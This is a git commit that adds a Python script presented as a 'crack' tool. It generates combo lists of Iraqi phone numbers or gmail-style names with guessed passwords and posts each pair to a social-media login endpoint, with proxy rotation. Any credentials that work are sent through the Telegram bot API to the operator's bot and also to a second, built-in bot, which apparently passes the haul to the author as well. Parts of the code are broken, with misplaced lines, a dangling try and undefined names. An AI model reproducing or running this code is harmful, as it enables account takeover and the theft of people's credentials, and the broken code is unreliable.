88f0612d2170aaafcd39c3287487a9016d4bfafc
vearahmad <69453119+vearahmad@users.noreply.github.com>
2024-06-20 22:49:20 +0300

    Create xxx.py

---
+++ xxx.py
@@ -0,0 +1,275 @@
+from urllib import request
+
+# Change Proxy  .......(-_-) .
+proxy = request.ProxyHandler(
+ )
+request.install_opener(request.build_opener(proxy))
+
+print("""\033[1;37m
+╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
+╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+
+\x1b[1;94m██████╗ ███████╗███████╗███████╗\x1b[38;5;202m 
+\x1b[1;92m██╔══██╗██╔════╝██╔════╝██╔════╝\x1b[38;5;190m
+\x1b[1;93m██████╔╝█████╗  ███████╗███████╗\x1b[35;7;27m
+\x1b[1;96m██╔══██╗██╔══╝  ╚════██║╚════██║\x1b[34;5;211m
+\x1b[1;91m██║  ██║███████╗███████║███████║\x1b[1;92m
+\x1b[1;95m╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\x1b[1;91m
+
+ \033[4;35m FACEBOOK(TLE/@A_T_9/💀🔥) >
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━𓌹RESS𓌺━━━━━━━━━━━━━━━━━━━━
+\x1b[1;94m{+} \x1b[38;5;202m𝙉𝘼𝙈𝙀 \x1b[1;97m:RESS
+\x1b[1;92m{+} \x1b[38;5;190m𝘿𝙀𝙑 \x1b[1;97m: \x1b[1;97m @A_T_9 
+\x1b[1;93m{+} \x1b[35;7;27m𝗖𝗛𝗔𝗡𝗡𝗘𝗟  \x1b[1;97m : \x1b[1;97m @aa3aaa3
+\x1b[1;96m{+} \x1b[34;5;211m𝐓𝐎𝐎𝐋 \x1b[1;97mRESS
+\x1b[1;91m{+} f\x1b[1;91m𝗔𝗖𝗘𝗕𝗢𝗢𝗞  \x1b[1;97m: 𝙁𝙄𝙇𝙀
+\x1b[1;92m━━━━━━━━━━━━━━━━━━━━𓌹RESS𓌺━━━━━━━━━━━━━━━━━━━━""") 
+
+
+def menu():
+	os.system('clear')
+	banner()
+	os.system(' ')
+	os.system('clear')
+	SALE = ('1')
+	if SALE in ['1','01']:
+		FILE()
+	if SALE in ['2','02']:
+		DUMP()
+		print('')
+		exit()
+
+import threading 
+import asyncio
+import os,sys,subprocess
+subprocess.getoutput("pip install requests")
+import requests,sys,os,time
+yso = 'LORD'
+pss=input("\033[1;37m [~]\033[1;35mENTER PASSWORD :\033[1;33m")
+if pss ==yso:
+ pass
+ print("\033[1;32m          SUCCESS PASSWORD ")
+ time.sleep(1)
+ os.system('clear')
+else:
+ exit('\033[1;31m             WORNG PASSWORD ')
+ 
+import requests
+import json
+import time
+import random
+import sys
+import os
+import requests
+
+
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
+user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
+
+# python3 /sdcard/tool.kurdish/test.py
+id_my = ''
+token_my = ''
+os.system('rm -rf Compo.txt')
+num = '''\033[32m 0770 + 0771 + 0772 + 0773 + 0774 + 0750 + 0751 + 0752 + 0753 + 0754 + 0780 + 0781 + 0782 + 0783 + 0784
+'''
+url="https://www.twitter.com/accounts/login/ajax/"
+headers={
+    "path": '/',
+    "scheme": 'https',
+    'authority': 'abs.twimg.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
+    'origin': 'https://x.com',
+    'referer': 'https://x.com/',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
+    proxyList = input('\033[1;37mproxy : \033[1;37m')
+def proxy():
+    logging.basicConfig()
+    pl = ProxyList()
+    try:
+        pl.load_file(proxyList)
+    except:
+        sys.exit('\033[1;31m[!] Proxy File format has incorrect | EXIT...\033[1;31m')
+    pl.random()
+    getProxy = pl.random().address()
+    b.set_proxies(proxies={"https": getProxy})
+    try:
+banek='''\x1b[1;97m
+ [\033[32m1\x1b[1;97m] - Crack RAQAM+PASS
+ [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
+ [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
+ [\033[32m4\x1b[1;97m] - Crack EMAIL+PASS
+ [\033[32m0\x1b[1;97m] - Exit Tool
+'''
+logo = '''\x1b[1;92m
+                                                                                                                                                                    
+ By :- @A_T_9 
+ ----------------------------------------------
+ 
+ '''
+logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
+
+def reba(FARA):
+	for e in FARA + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.010)
+
+def menu():
+	os.system('clear')
+	print(logo)
+	print(logo2)
+	print(banek)
+	aco()
+
+def aco():
+	reb = input('---> ')
+	print(num)
+	
+	if reb=='1':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Compo.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+user+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	
+	elif reb=='2':
+		sfr = input(' \x1b[1;97mchand bet:\033[32m ')
+		op=open('Compo.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			user =x1+x2+x3+x4+x5+x6+x7
+			kk = '+964'+sfr
+			op.write(kk+user+':'+'0'+sfr+user+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	
+	elif reb=='3':
+		print(' \033[32mname bnosa')
+		sfr = input(' \x1b[1;97mname: \033[32m')
+		op=open('Compo.txt','w')
+		for x in range(10000):
+			f = "1234567890"
+			x1 = random.choice(f)
+			x2 = random.choice(f)
+			x3 = random.choice(f)
+			x4 = random.choice(f)
+			x5 = random.choice(f)
+			x6 = random.choice(f)
+			x7 = random.choice(f)
+			kk =sfr+x1+x2+x3+'@gmail.com'
+			op.write(kk+':'+sfr+x1+x2+x3+'\n')
+		op.close()
+		combo = ('Compo.txt')
+	elif reb=='4':
+		print(logo)
+		print(logo2)
+		fg =input(' sdcard Compo: ')
+		combo=fg
+	elif reb=='0':
+		print('[-] Exit tool')
+		sys.exit()
+	else:
+		sys.exit()
+	
+	crack()
+
+
+def crack():
+	r0=0
+	r1=0
+	r2=0
+	r3=0
+	r4=0
+	for x in open('Compo.txt','r').read().splitlines():
+		user = x.split(":")[0]
+		pas = x.split(":")[1]
+		
+		data={'username': user,'enc_password': "#PWD_INSTAGRAM_BROWSER:0:&:"+pas,}
+		reba=requests.post(url, data=data, headers=headers).text
+		if ('"authenticated":true') in reba:
+			r1+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m GOOD : '+str(r1))
+			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			sender =user+' : '+pas
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
+			response = requests.get(send_telegram)
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
+			responsek = requests.get(send_my)
+			r2+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m GOOD : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+		
+		
+			r4+=1
+			os.system('clear')
+		
+			print(logo)
+			print(logo2)
+			print('\033[32m GOOD : '+str(r1))
+			print('\033[93m CP : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+			print(reba)
+			time.sleep(50.0)
+			r0=0
+			
+			
+		else:
+			r3+=1
+			os.system('clear')
+			
+			print(logo)
+			print(logo2)
+			print('\033[32m GOOD : '+str(r1))
+			print('\033[93m Checkpoint : '+str(r2))
+			print('\033[31m Bad : '+str(r3))
+			print(logo2)
+
+
+
+
+os.system('clear')
+print(logo)
+print(logo2)
+id_tg =input(' ID : ')
+token_bot=input(' TOKEN BOT: ')
+time.sleep(0.5)
+menu()
